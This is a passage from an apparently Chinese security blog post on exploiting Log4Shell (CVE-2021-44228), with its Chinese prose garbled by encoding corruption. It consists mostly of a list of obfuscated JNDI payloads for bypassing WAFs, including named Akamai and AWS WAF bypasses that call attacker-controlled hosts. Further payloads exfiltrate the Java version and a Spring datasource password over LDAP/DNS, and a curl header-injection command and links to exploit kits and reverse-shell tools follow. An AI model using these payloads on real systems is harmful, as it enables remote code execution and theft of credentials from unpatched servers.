https://d0znpp.medium.com/bypassing-ngfw-wafs-using-data-format-obfuscations-188351ea9e73
```



#### 14.PDF

åˆ¶ä½œç‰¹æ®Šçš„ pdf æ–‡ä»¶ä»¥åˆ©ç”¨ CVE-2021-44228

![PDF example](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/147821759-3532d8f8-2378-4405-a333-e56d8e7e7a8a.png)

**ä»¥ä¸Šå†…å®¹æ¥è‡ª `https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words` **



#### å…¶ä»–çš„ä¸€äº›bypassæ–¹æ³•

```json
${lower:${ğŸ…°ï¸d:-${lower:}}jndi:}

${jndi:ldap://attacker.com/a}

${j${upper:${lower:n}}di:ldap://attacker.com/a}

${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker.com/a}

${${env:BARFOO:-j}Ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}

${${::-j}ndi:rmi://127.0.0.1:1389/ass}

${jndi:rmi://a.b.c}

${${lower:jndi}:${lower:rmi}://q.w.e/poc}

${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://l}

${${::-j}ndi:rmi://}

${${lower:jndi}:${lower:rmi}://}

${${lower:${lower:jndi}}:${lower:rmi}://

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}:}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}

${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}

${jndi:rmi://adsasd.asdasd.asdasd}

${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}

${j${upper:n:-}di:ldap://example.com:1389

${j${k8s:k5:-ND}i${sd:k5:-:}ldap://kjhkjhkjh}

${j${main:\k5:-Nd}i${spring:k5:-:}ldap://kjhkjhkjh}

${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://kjhkjhkjh}

${j${::-nD}i${::-:}ldap://kjhkjhkjh}

${j${EnV:K5:-nD}i:ldap://kjhkjhkjh}

${j${loWer:Nd}i${uPper::}ldap}

${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:l}dap${env:NaN:-:}//your.burpcollaborator.net/a}

${${upper:}jndi:ldap://example.com/a}

${j${upper::-n}di:ldap://example.com:1389/a}

${"Â£$_"Â£ğŸ…°ï¸d:-${lower:j}n}di:

${ğŸ…°ï¸d:-${lower:}j}ndi:

${ğŸ…°ï¸d:-${lower:j}n}di:

#Akamai Bypass Log4j
${jndi${123%25ff:-}:ldap://HOST:PORT/a}

#Amazon AWS WAf Bypass
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://HOST:PORT/a}

${jnd${123%25ff:-${123%25ff:-i:}}ldap://HOST:PORT/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//dnslog.cn/a}
${jndi:ldap://127.0.0.1:1389/ badClassName}
```



#### ä¸€äº›è·å–ä¿¡æ¯çš„payload

```
#ç›®æ ‡javaç‰ˆæœ¬
${jndi:ldap://${sys:java.version}.dnslog.cn}
```

![å›¾ç‰‡](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/FGT0Im-UcAIq7IA.png)

#### JSON bypass ${

```json
{"key":"\u0024\u007b"}
or
{"key":"\x24\u007b"}
```



#### sysã€env bypass

```
#sys
System.getProperty()

#env
System.getenv()
```



#### 0x04 `ResourceBundleLookup`é…åˆlog4jè·å–æ•æ„Ÿä¿¡æ¯

```java

public String lookup(final LogEvent event, final String key) {
    if (key == null) {
        return null;
    }
    final String[] keys = key.split(":");
    final int keyLen = keys.length;
    if (keyLen != 2) {
        LOGGER.warn(LOOKUP, "Bad ResourceBundle key format [{}]. Expected format is BundleName:KeyName.", key);
        return null;
    }
    final String bundleName = keys[0];
    final String bundleKey = keys[1];
    try {
        // The ResourceBundle class caches bundles, no need to cache here.
        return ResourceBundle.getBundle(bundleName).getString(bundleKey);
    } catch (final MissingResourceException e) {
        LOGGER.warn(LOOKUP, "Error looking up ResourceBundle [{}].", bundleName, e);
        return null;
    }
}
```

ä»ä»£ç ä¸Šæ¥çœ‹å°±å¾ˆå¥½ç†è§£ï¼ŒæŠŠ key æŒ‰ç…§ : åˆ†å‰²æˆä¸¤ä»½ï¼Œç¬¬ä¸€ä¸ªæ˜¯ bundleName è·å– ResourceBundleï¼Œç¬¬äºŒä¸ªæ˜¯ bundleKey è·å– Properties Value

ResourceBundle åœ¨ Java åº”ç”¨å¼€å‘ä¸­ç»å¸¸è¢«ç”¨æ¥åšå›½é™…åŒ–ï¼Œç½‘ç«™é€šå¸¸ä¼šç»™ä¸€æ®µè¡¨è¿°çš„å†…å®¹ç¿»è¯‘æˆå¤šç§è¯­è¨€ï¼Œæ¯”å¦‚ä¸­æ–‡ç®€ä½“ã€ä¸­æ–‡ç¹ä½“ã€è‹±æ–‡ã€‚

é‚£å¼€å‘è€…å¯èƒ½å°±ä¼šä½¿ç”¨ ResourceBundle æ¥åˆ†åˆ«åŠ è½½ classpath ä¸‹çš„ zh_CN.propertiesã€en_US.propertiesã€‚å¹¶æŒ‰ç…§å”¯ä¸€çš„ key å–å‡ºå¯¹åº”çš„é‚£æ®µæ–‡å­—ã€‚ä¾‹å¦‚ï¼š **zh_CN.properties**

```
LOGIN_SUCCESS=ç™»å½•æˆåŠŸ
```

é‚£ `ResourceBundle.getBundle("zh_CN").getString("LOGIN_SUCCESS")` è·å–åˆ°çš„å°±æ˜¯ `ç™»å½•æˆåŠŸ`

å¦‚æœç³»ç»Ÿæ˜¯ springboot çš„è¯ï¼Œå®ƒä¼šæœ‰ä¸€ä¸ª application.properties é…ç½®æ–‡ä»¶ã€‚é‡Œé¢å­˜æ”¾ç€è¿™ä¸ªç³»ç»Ÿçš„å„é¡¹é…ç½®ï¼Œå…¶ä¸­æœ‰å¯èƒ½å°±åŒ…å« redisã€mysql çš„é…ç½®é¡¹ã€‚å½“ç„¶ä¹Ÿä¸æ­¢ springbootï¼Œå¾ˆå¤šå…¶ä»–ç±»å‹çš„ç³»ç»Ÿä¹Ÿä¼šå†™ä¸€äº›ç±»ä¼¼ jdbc.properties çš„æ–‡ä»¶æ¥å­˜æ”¾é…ç½®ã€‚

è¿™äº› properties æ–‡ä»¶éƒ½å¯ä»¥é€šè¿‡ ResourceBundle æ¥è·å–åˆ°é‡Œé¢çš„é…ç½®é¡¹ã€‚æ‰€ä»¥åœ¨ log4j ä¸­ Bundle æ˜¯æ¯”syså’Œenvæ›´ä¸¥é‡çš„å­˜åœ¨ã€‚

payload:

```java
${bundle:application:spring.datasource.password}
ldap://127.0.0.1/${bundle:application:spring.datasource.password}
dns://127.0.0.1/${bundle:application:spring.datasource.password}
```

![å›¾ç‰‡](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/640.webp)





#### 0x05 å—å½±å“åˆ—è¡¨



æ±‡æ€»:

https://gist.github.com/N0b1ta/d67a41b5582c9315d4148eebb3b3b39e

https://mvnrepository.com/artifact/log4j/log4j/usages

https://github.com/YfryTchsGD/Log4jAttackSurface





CISCOå—å½±å“äº§å“

https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd#vp



#### 0x06  ä¸€äº›ä¸»è¦äº§å“çš„åˆ©ç”¨æ–¹å¼

##### Spring Boot

```
curl <target ip:port> -H "X-Api-Version":{payload}

https://www.youtube.com/watch?v=pyY-1jX7Wg4
```



ä¼šé™†ç»­æ·»åŠ è‡³[bitwiki](https://wiki.1bit.win/doc/)



#### 0x07 æ¨èå·¥å…·

payload ç”Ÿæˆå™¨ : https://github.com/woodpecker-appstore/log4j-payload-generator

PDF log4j2åˆ©ç”¨ ï¼šhttps://github.com/eelyvy/log4jshell-pdf

æ”¯æŒlog4j2çš„åå‘shell : https://github.com/H0j3n/EzpzShell 

ä¸€äº›å¹³å°çš„payload ï¼š https://github.com/OneBitSec/CVE-2021-44228-Log4j-Payloads

poc.java : https://github.com/OneBitSec/apache-log4j-rce-poc

JNDI æ¼æ´åˆ©ç”¨å·¥å…·åŒ… ï¼š https://github.com/pimps/JNDI-Exploit-Kit

æ¼æ´åˆ©ç”¨æ‰©å±•ï¼šhttps://github.com/OneBitSec/Log4j2-CVE-2021-44228

é€šè¿‡ç”¨æˆ·æµè§ˆå™¨é—´æ¥åˆ©ç”¨å†…éƒ¨ç½‘ç»œèµ„æº ï¼šhttps://blog.olliejc.uk/2021/12/12/log4shell-could-be-exploited-from-your-network/
